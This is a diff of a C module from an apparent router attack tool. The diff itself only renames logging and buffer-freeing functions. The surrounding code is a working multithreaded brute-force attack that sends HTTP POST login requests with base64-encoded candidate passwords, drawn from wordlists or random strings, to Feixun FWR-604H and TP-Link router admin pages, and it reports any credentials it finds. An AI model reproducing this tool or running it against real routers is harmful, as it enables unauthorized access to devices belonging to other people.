@@ -18,10 +18,10 @@
 // and now this module will not work any more until dos module compelete
 
 // from ../core/debug.c
-extern int DisplayDebug(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
-extern int DisplayInfo(const char *fmt, ...);
-extern int DisplayWarning(const char *fmtsring, ...);
-extern int DisplayError(const char *fmt, ...);
+extern int Debug(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
+extern int DebugInfo(const char *fmt, ...);
+extern int DebugWarning(const char *fmtsring, ...);
+extern int DebugError(const char *fmt, ...);
 
 // from ../core/str.c
 extern char *GetRandomPassword(char **rebuf, unsigned int seed, const int length);
@@ -41,7 +41,7 @@ extern void FreeHTTPSMethodBuff(char *p);
 // from ../core/base64.c
 extern size_t Base64Encode(char **b64message, const unsigned char *buffer, size_t length);
 extern size_t Base64Decode(unsigned char **buffer, char *b64message);
-extern void FreeBase64(char *b64message);
+extern void FreeBase64Buffer(char *b64message);
 
 // value for check
 char *REQUEST;
@@ -69,7 +69,7 @@ static int MatchModel(pMatchOutput *output, const char *input)
         (*output) = (pMatchOutput)malloc(sizeof(MatchOutput));
         if (!(*output))
         {
-            DisplayError("MatchModel malloc failed");
+            DebugError("MatchModel malloc failed");
             return 1;
         }
         (*output)->request = FEIXUN_FWR_604H_POST_REQUEST;
@@ -82,7 +82,7 @@ static int MatchModel(pMatchOutput *output, const char *input)
         (*output) = (pMatchOutput)malloc(sizeof(MatchOutput));
         if (!(*output))
         {
-            DisplayError("MatchModel malloc failed");
+            DebugError("MatchModel malloc failed");
             return 1;
         }
         (*output)->request = TPLINK_POST_REQUEST;
@@ -97,7 +97,7 @@ static int MatchModel(pMatchOutput *output, const char *input)
     }
     else
     {
-        DisplayError("Can not found that model: %s", input);
+        DebugError("Can not found that model: %s", input);
         return 1;
     }
 
@@ -112,7 +112,7 @@ static int CheckResponse(void)
     {
         if (strstr(RESPONSE, SUCCESS_MODEL))
         {
-            DisplayInfo("Found the password");
+            DebugInfo("Found the password");
             return 0;
         }
     }
@@ -120,7 +120,7 @@ static int CheckResponse(void)
     {
         if (WATCH_LENGTH == RESPONSE_LENGTH)
         {
-            DisplayInfo("Found the password");
+            DebugInfo("Found the password");
             return 0;
         }
     }
@@ -133,31 +133,31 @@ static int UListPList(pInput input, size_t u_start, size_t u_end, size_t p_start
     // username is a list and password is list too
     if (!(input->gau->u_header))
     {
-        DisplayError("UListPList get u_header failed");
+        DebugError("UListPList get u_header failed");
         return 1;
     }
     pStrNode us;
     if (LocateStrNodeElement(input->gau->u_header, &us, u_start))
     {
-        DisplayError("UListPList LocateStrNodeElement failed");
+        DebugError("UListPList LocateStrNodeElement failed");
         return 1;
     }
     pStrNode ue;
     if (LocateStrNodeElement(input->gau->u_header, &ue, u_end))
     {
-        DisplayError("UListPList LocateStrNodeElement failed");
+        DebugError("UListPList LocateStrNodeElement failed");
         return 1;
     }
     pStrNode ps;
     if (LocateStrNodeElement(input->gau->p_header, &ps, p_start))
     {
-        DisplayError("UListPList LocateStrNodeElement failed");
+        DebugError("UListPList LocateStrNodeElement failed");
         return 1;
     }
     pStrNode pe;
     if (LocateStrNodeElement(input->gau->p_header, &pe, p_end))
     {
-        DisplayError("UListPList LocateStrNodeElement failed");
+        DebugError("UListPList LocateStrNodeElement failed");
         return 1;
     }
     pStrNode p;
@@ -169,14 +169,14 @@ static int UListPList(pInput input, size_t u_start, size_t u_end, size_t p_start
 
     if (!SplitURL(input->address, &sp))
     {
-        DisplayError("SplitURL failed");
+        DebugError("SplitURL failed");
         return 1;
     }
     while (us != ue)
     {
         if (!(input->gau->p_header))
         {
-            DisplayError("UListPList get p_header failed");
+            DebugError("UListPList get p_header failed");
             return 1;
         }
         p = ps;
@@ -185,42 +185,42 @@ static int UListPList(pInput input, size_t u_start, size_t u_end, size_t p_start
             // base64
             if (!memset(request, 0, sizeof(request)))
             {
-                DisplayError("UListPlist memset failed");
+                DebugError("UListPlist memset failed");
                 return 1;
             }
             if (!memset(data, 0, sizeof(data)))
             {
-                DisplayError("UListPlist memset failed");
+                DebugError("UListPlist memset failed");
                 return 1;
             }
             if (!Base64Encode(&b64message, (unsigned char *)p->str, strlen(p->str)))
             {
-                DisplayError("Base64Encode failed");
+                DebugError("Base64Encode failed");
                 return 1;
             }
 
             // combined data now
             if (!sprintf(data, REQUEST_DATA, us->str, b64message))
             {
-                DisplayError("UListPlist sprintf failed");
+                DebugError("UListPlist sprintf failed");
                 return 1;
             }
             if (!sprintf(request, REQUEST, sp->host, input->address, strlen(data), data))
             {
-                DisplayError("UListPlist sprintf failed");
+                DebugError("UListPlist sprintf failed");
                 return 1;
             }
 
             // send now
-            DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "try username: %s, password: %s", us->str, p->str);
+            Debug(DEBUG_LEVEL_1, input->debug_level, "try username: %s, password: %s", us->str, p->str);
             if (!HTTPMethod(input->address, request, &response, 0))
             {
-                DisplayError("HTTPMethod failed");
+                DebugError("HTTPMethod failed");
                 return 1;
             }
 
             // for debug use
-            DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "%s", response);
+            Debug(DEBUG_LEVEL_2, input->debug_level, "%s", response);
             if (CHECK == CheckLength)
             {
                 RESPONSE_LENGTH = strlen(response);
@@ -232,11 +232,11 @@ static int UListPList(pInput input, size_t u_start, size_t u_end, size_t p_start
             // now check
             if (!CheckResponse())
             {
-                DisplayInfo("Username: %s - Password: %s", us->str, p->str);
+                DebugInfo("Username: %s - Password: %s", us->str, p->str);
                 return 0;
             }
             FreeHTTPMethodBuff(response);
-            FreeBase64(b64message);
+            FreeBase64Buffer(b64message);
             p = p->next;
         }
         us = us->next;
@@ -260,7 +260,7 @@ static int UOnePRandom(pInput input)
 
     if (!SplitURL(input->address, &sp))
     {
-        DisplayError("SplitURL failed");
+        DebugError("SplitURL failed");
         return 1;
     }
 
@@ -273,38 +273,38 @@ static int UOnePRandom(pInput input)
         }
         if (!GetRandomPassword(&password, seed, input->random_password_length))
         {
-            DisplayError("GetRandomPassword failed");
+            DebugError("GetRandomPassword failed");
             return 1;
         }
 
         // base64
         if (!Base64Encode(&b64message, (unsigned char *)password, strlen(password)))
         {
-            DisplayError("Base64Encode failed");
+            DebugError("Base64Encode failed");
             return 1;
         }
 
         // combined data now
         if (!sprintf(data, REQUEST_DATA, input->username, b64message))
         {
-            DisplayError("UOnePRandom sprintf failed");
+            DebugError("UOnePRandom sprintf failed");
             return 1;
         }
         if (!sprintf(request, REQUEST, sp->host, input->address, strlen(data), data))
         {
-            DisplayError("UOnePRandom sprintf failed");
+            DebugError("UOnePRandom sprintf failed");
             return 1;
         }
 
         // send now
-        DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "try username: %s, password: %s", input->username, password);
+        Debug(DEBUG_LEVEL_1, input->debug_level, "try username: %s, password: %s", input->username, password);
         if (!HTTPMethod(input->address, request, &response, 0))
         {
-            DisplayError("HTTPMethod failed");
+            DebugError("HTTPMethod failed");
             return 1;
         }
         // for debug
-        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "%s", response);
+        Debug(DEBUG_LEVEL_2, input->debug_level, "%s", response);
         if (CHECK == CheckLength)
         {
             RESPONSE_LENGTH = strlen(response);
@@ -315,13 +315,13 @@ static int UOnePRandom(pInput input)
         }
         if (!CheckResponse())
         {
-            DisplayInfo("Username: %s - Password: %s", input->username, password);
+            DebugInfo("Username: %s - Password: %s", input->username, password);
             return 0;
         }
 
         FreeHTTPMethodBuff(response);
         FreeRandomPasswordBuff(password);
-        FreeBase64(b64message);
+        FreeBase64Buffer(b64message);
     }
 
     return 0;
@@ -331,7 +331,7 @@ static int UOnePList(pInput input, size_t p_start, size_t p_end)
 {
     if (!(input->gau->p_header))
     {
-        DisplayError("UOnePList get p_header failed");
+        DebugError("UOnePList get p_header failed");
         return 1;
     }
 
@@ -347,7 +347,7 @@ static int UOnePList(pInput input, size_t p_start, size_t p_end)
 
     if (!SplitURL(input->address, &sp))
     {
-        DisplayError("SplitURL failed");
+        DebugError("SplitURL failed");
         return 1;
     }
 
@@ -357,39 +357,39 @@ static int UOnePList(pInput input, size_t p_start, size_t p_end)
         // base64
         if (!memset(request, 0, sizeof(request)))
         {
-            DisplayError("UOnePList memset failed");
+            DebugError("UOnePList memset failed");
             return 1;
         }
         if (!memset(data, 0, sizeof(data)))
         {
-            DisplayError("UOnePList memset failed");
+            DebugError("UOnePList memset failed");
             return 1;
         }
         if (!Base64Encode(&b64message, (unsigned char *)ps->str, strlen(ps->str)))
         {
-            DisplayError("Base64Encode failed");
+            DebugError("Base64Encode failed");
             return 1;
         }
 
         // combined data now
         if (!sprintf(data, REQUEST_DATA, input->username, b64message))
         {
-            DisplayError("UOnePList sprintf failed");
+            DebugError("UOnePList sprintf failed");
             return 1;
         }
         if (!sprintf(request, REQUEST, sp->host, input->address, strlen(data), data))
         {
-            DisplayError("UOnePList sprintf failed");
+            DebugError("UOnePList sprintf failed");
             return 1;
         }
 
         // send now
         pthread_t self;
         self = pthread_self();
-        DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "tid: %lu, try username: %s, password: %s", self, input->username, ps->str);
+        Debug(DEBUG_LEVEL_1, input->debug_level, "tid: %lu, try username: %s, password: %s", self, input->username, ps->str);
         if (!HTTPMethod(input->address, request, &response, 0))
         {
-            DisplayError("HTTPMethod failed");
+            DebugError("HTTPMethod failed");
             return 1;
         }
 
@@ -404,11 +404,11 @@ static int UOnePList(pInput input, size_t p_start, size_t p_end)
         }
         if (!CheckResponse())
         {
-            DisplayInfo("Username: %s - Password: %s", input->username, ps->str);
+            DebugInfo("Username: %s - Password: %s", input->username, ps->str);
             return 0;
         }
         FreeHTTPMethodBuff(response);
-        FreeBase64(b64message);
+        FreeBase64Buffer(b64message);
         ps = ps->next;
     }
 
@@ -426,51 +426,51 @@ static int UTestPTest(pInput input, int *length)
 
     if (!SplitURL(input->address, &sp))
     {
-        DisplayError("UTestPTest SplitURL failed");
+        DebugError("UTestPTest SplitURL failed");
         return 1;
     }
 
     // base64
     if (!memset(request, 0, sizeof(request)))
     {
-        DisplayError("UTestPTest memset failed");
+        DebugError("UTestPTest memset failed");
         return 1;
     }
     if (!memset(data, 0, sizeof(data)))
     {
-        DisplayError("UTestPTest memset failed");
+        DebugError("UTestPTest memset failed");
         return 1;
     }
     if (!Base64Encode(&b64message, (unsigned char *)test_password, strlen(test_password)))
     {
-        DisplayError("Base64Encode failed");
+        DebugError("Base64Encode failed");
         return 1;
     }
 
     // combined data now
     if (!sprintf(data, REQUEST_DATA, input->username, b64message))
     {
-        DisplayError("UTestPTest sprintf failed");
+        DebugError("UTestPTest sprintf failed");
         return 1;
     }
     if (!sprintf(request, REQUEST, sp->host, input->address, strlen(data), data))
     {
-        DisplayError("UTestPTest sprintf failed");
+        DebugError("UTestPTest sprintf failed");
         return 1;
     }
 
     // send now
-    DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "try username: %s, password: %s", input->username, test_password);
+    Debug(DEBUG_LEVEL_1, input->debug_level, "try username: %s, password: %s", input->username, test_password);
     if (!HTTPMethod(input->address, request, &response, 0))
     {
-        DisplayError("HTTPMethod failed");
+        DebugError("HTTPMethod failed");
         return 1;
     }
 
-    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "%s", response);
+    Debug(DEBUG_LEVEL_2, input->debug_level, "%s", response);
     (*length) = (int)strlen(response);
     FreeHTTPMethodBuff(response);
-    FreeBase64(b64message);
+    FreeBase64Buffer(b64message);
 
     return 0;
 }
@@ -496,7 +496,7 @@ static unsigned long MultiThreadControl(pInput input, size_t *start, size_t *end
     {
         if (node->tid == self)
         {
-            DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "thread id: %d", node->id);
+            Debug(DEBUG_LEVEL_1, input->debug_level, "thread id: %d", node->id);
             *start = (size_t)node->id * cut;
             *end = ((size_t)node->id + 1) * cut;
             return 0;
@@ -513,7 +513,7 @@ static int AttackThread(pInput input)
     pMatchOutput mt;
     if (MatchModel(&mt, input->model_type))
     {
-        DisplayError("MatchModel failed");
+        DebugError("MatchModel failed");
         return 1;
     }
     REQUEST = mt->request;
@@ -548,13 +548,13 @@ static int AttackThread(pInput input)
         tid = MultiThreadControl(input, &p_start, &p_end, PHEADER);
         if (tid)
         {
-            DisplayError("GuessAttack MultiThreadControl can not found the tid");
-            DisplayError("tid: %ld", tid);
+            DebugError("GuessAttack MultiThreadControl can not found the tid");
+            DebugError("tid: %ld", tid);
             return 1;
         }
         if (UOnePList(input, p_start, p_end))
         {
-            DisplayError("GuessAttack UOnePList failed");
+            DebugError("GuessAttack UOnePList failed");
             return 1;
         }
     }
@@ -562,7 +562,7 @@ static int AttackThread(pInput input)
     {
         if (UOnePRandom(input))
         {
-            DisplayError("GuessAttack UOnePRondom failed");
+            DebugError("GuessAttack UOnePRondom failed");
             return 1;
         }
     }
@@ -573,27 +573,27 @@ static int AttackThread(pInput input)
         tid = MultiThreadControl(input, &u_start, &u_end, UHEADER);
         if (tid)
         {
-            DisplayError("GuessAttack MultiThreadControl can not found the tid");
-            DisplayError("tid: %ld", tid);
+            DebugError("GuessAttack MultiThreadControl can not found the tid");
+            DebugError("tid: %ld", tid);
             return 1;
         }
         tid = 0;
         tid = MultiThreadControl(input, &p_start, &p_end, PHEADER);
         if (tid)
         {
-            DisplayError("GuessAttack MultiThreadControl can not found the tid");
-            DisplayError("tid: %ld", tid);
+            DebugError("GuessAttack MultiThreadControl can not found the tid");
+            DebugError("tid: %ld", tid);
             return 1;
         }
         if (UListPList(input, u_start, u_end, p_start, p_end))
         {
-            DisplayError("GuessAttack UListPList failed");
+            DebugError("GuessAttack UListPList failed");
             return 1;
         }
     }
     else
     {
-        DisplayError("Unknow guess attack type");
+        DebugError("Unknow guess attack type");
         return 1;
     }
     FreeMatchModelBuff(mt);
@@ -611,7 +611,7 @@ int StartGuessAttack(const pInput input)
     pGuessAttackUse gau = (pGuessAttackUse)malloc(sizeof(GuessAttackUse));
     gau->u_header = NULL;
     gau->p_header = NULL;
-    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartAttackProcess");
+    Debug(DEBUG_LEVEL_3, input->debug_level, "Enter StartAttackProcess");
 
     // we are not allowed the username from linked list but password from random string
     if (input->get_response_length == ENABLE)
@@ -620,10 +620,10 @@ int StartGuessAttack(const pInput input)
         int length = AttackThread(input);
         if (length == -1)
         {
-            DisplayError("GuessAttack_Thread failed");
+            DebugError("GuessAttack_Thread failed");
             return 1;
         }
-        DisplayInfo("Response length is %d", length);
+        DebugInfo("Response length is %d", length);
         return 0;
     }
     else if (input->watch_length > 0)
@@ -663,26 +663,26 @@ int StartGuessAttack(const pInput input)
         input->seed = j;
         if (pthread_attr_init(&attr))
         {
-            DisplayError("StartGuess pthread_attr_init failed");
+            DebugError("StartGuess pthread_attr_init failed");
             return 1;
         }
         //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
         if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
         {
-            DisplayError("StartGuess pthread_attr_setdetachstate failed");
+            DebugError("StartGuess pthread_attr_setdetachstate failed");
             return 1;
         }
         // create thread
         ret = pthread_create(&tid[j], &attr, (void *)AttackThread, input);
         //printf("j is: %d\n", j);
-        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
+        Debug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
         // here we make a map
         tcn->tid = tid[j];
         tcn->id = j;
         if (ret != 0)
         {
-            DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
-            DisplayError("Create pthread failed");
+            Debug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
+            DebugError("Create pthread failed");
             return 1;
         }
         tcn->next = input->tch->next;
@@ -709,7 +709,7 @@ int StartGuessAttack(const pInput input)
     {
         free(gau);
     }
-    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Exit StartAttackProcess");
+    Debug(DEBUG_LEVEL_3, input->debug_level, "Exit StartAttackProcess");
     return 0;
 }
 
@@ -719,7 +719,7 @@ int StartGuessTest(const pInput input)
     pGuessAttackUse gau = (pGuessAttackUse)malloc(sizeof(GuessAttackUse));
     gau->u_header = NULL;
     gau->p_header = NULL;
-    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartAttackTestProcess");
+    Debug(DEBUG_LEVEL_3, input->debug_level, "Enter StartAttackTestProcess");
 
     // we are not allowed the username from linked list but password from random string
     if (input->get_response_length == ENABLE)
@@ -728,10 +728,10 @@ int StartGuessTest(const pInput input)
         int length = AttackThread(input);
         if (length == -1)
         {
-            DisplayError("GuessAttack_Thread failed");
+            DebugError("GuessAttack_Thread failed");
             return 1;
         }
-        DisplayInfo("Response length is %d", length);
+        DebugInfo("Response length is %d", length);
         return 0;
     }
     else if (input->watch_length > 0)
@@ -742,14 +742,14 @@ int StartGuessTest(const pInput input)
     {
         if (!ProcessGuessAttackFile(input->password_path, &(gau->p_header), 1))
         {
-            DisplayError("ProcessGuessAttackFile failed");
+            DebugError("ProcessGuessAttackFile failed");
             return 1;
         }
         if (strlen(input->username_path) > 0)
         {
             if (!ProcessGuessAttackFile(input->username_path, &(gau->u_header), 0))
             {
-                DisplayError("ProcessGuessAttackFile failed");
+                DebugError("ProcessGuessAttackFile failed");
                 return 1;
             }
             input->guess_attack_type = GUESS_ULPL;
@@ -784,7 +784,7 @@ int StartGuessTest(const pInput input)
     {
         free(gau);
     }
-    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Exit StartAttackProcess");
+    Debug(DEBUG_LEVEL_3, input->debug_level, "Exit StartAttackProcess");
     return 0;
 }
 
